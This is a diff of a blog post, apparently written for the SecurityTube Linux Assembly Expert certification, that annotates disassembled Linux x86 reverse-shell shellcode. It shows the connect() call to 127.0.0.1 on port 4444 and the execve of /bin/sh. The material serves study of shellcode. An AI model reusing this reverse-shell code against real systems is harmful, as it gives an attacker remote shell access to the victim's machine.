@@ -623,14 +623,32 @@ This will duplicate our standard file descriptors ```STDIN```, ```STDOUT``` and 
 
 The next section of code deals with ```connect()```(```connect(s,2,port,addr,16```)):
 ```nasm
-0x00404058 <+24>:    push   0x100007f              ;ip
-0x0040405d <+29>:    push   0x5c110002             ;port
+0x00404058 <+24>:    push   0x100007f              ;ip(127.0.0.1)
+0x0040405d <+29>:    push   0x5c110002             ;port(4444)
 0x00404062 <+34>:    mov    ecx,esp                ;pointer to args
 0x00404064 <+36>:    mov    al,0x66                ;socketcall
-0x00404066 <+38>:    push   eax                    ;length of addr struct
+0x00404066 <+38>:    push   eax                    ;length of addr struct(16)
 0x00404067 <+39>:    push   ecx                    ;ip and port
 0x00404068 <+40>:    push   ebx                    ;sockfd
 0x00404069 <+41>:    mov    bl,0x3                 ;ebx=3 --> connect()
 0x0040406b <+43>:    mov    ecx,esp                ;pointer to args
 0x0040406d <+45>:    int    0x80                   ;syscall
 ```
+The last section of code deals with ```execve()```:
+```nasm
+0x0040406f <+47>:    push   edx                    ;NULLS
+0x00404070 <+48>:    push   0x68732f6e             ;//bin/sh
+0x00404075 <+53>:    push   0x69622f2f
+0x0040407a <+58>:    mov    ebx,esp                ;pointer to null-terminated string
+0x0040407c <+60>:    push   edx                    
+0x0040407d <+61>:    push   ebx
+0x0040407e <+62>:    mov    ecx,esp                ;pointer to args
+0x00404080 <+64>:    mov    al,0xb                 ;execve
+0x00404082 <+66>:    int    0x80                   ;syscall
+```
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE - 1534
